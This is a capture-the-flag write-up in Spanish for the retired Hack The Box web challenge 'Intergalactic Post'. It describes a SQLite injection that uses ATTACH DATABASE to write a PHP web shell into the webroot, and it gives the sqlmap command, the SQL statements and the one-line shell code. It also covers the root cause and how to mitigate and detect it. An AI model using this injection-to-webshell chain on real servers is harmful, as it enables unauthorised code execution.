---
challenge: Intergalactic Post
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, sqlite, rce, php]
---

# Intergalactic Post — Hack The Box (Challenge)

[🌐 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

Una SQLi en SQLite permite escribir un archivo PHP en el webroot mediante `ATTACH DATABASE`. Al visitarlo se ejecuta código y se lee la flag.

## Enunciado y superficie

- Web, Easy, retirado.
- Formulario/parámetro de búsqueda o suscripción.
- Backend SQLite.

```bash
curl -i 'http://<HOST>/?search=test'
```

## Reconocimiento

Se confirma la inyección con una comilla y se identifica SQLite por los errores. Se enumeran tablas y columnas.

```bash
sqlmap -u 'http://<HOST>/?search=test' --batch --dbms=sqlite --dbs
```

## Análisis

1. Se confirma que el usuario de la base puede escribir archivos.
2. Se usa `ATTACH DATABASE '/var/www/html/shell.php' AS pwn`.
3. Se crea una tabla con código PHP en una columna.
4. Se visita `shell.php?cmd=id`.
5. Se lee la flag.

```sql
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.x (y text);
INSERT INTO pwn.x VALUES ('<?php system($_GET["cmd"]); ?>');
```

## Explicación del fallo

La consulta concatena entrada y la base tiene permisos de escritura en el webroot. SQLite permite adjuntar una base como archivo PHP.

## Reproducción local

1. Montar SQLite + PHP.
2. Confirmar SQLi.
3. Escribir el archivo.
4. Ejecutar el webshell.
5. Restringir permisos y comparar.

## Evidencia

- Error/confirmación SQLi.
- Consulta de escritura.
- Webshell y flag redactada.

## Lecciones aprendidas

- SQLite permite `ATTACH DATABASE`.
- La escritura en webroot convierte SQLi en RCE.
- Los permisos de la base importan.
- La parametrización evita todo.

## Mitigación y detección

- Consultas preparadas.
- Usuario de base sin escritura en webroot.
- Webroot sin ejecución de archivos subidos.
- Monitorizar archivos PHP nuevos.

## Referencias

- <https://www.hackthebox.com/challenges/intergalactic-post>
- <https://www.sqlite.org/lang_attach.html>
- <https://owasp.org/www-community/attacks/SQL_Injection>
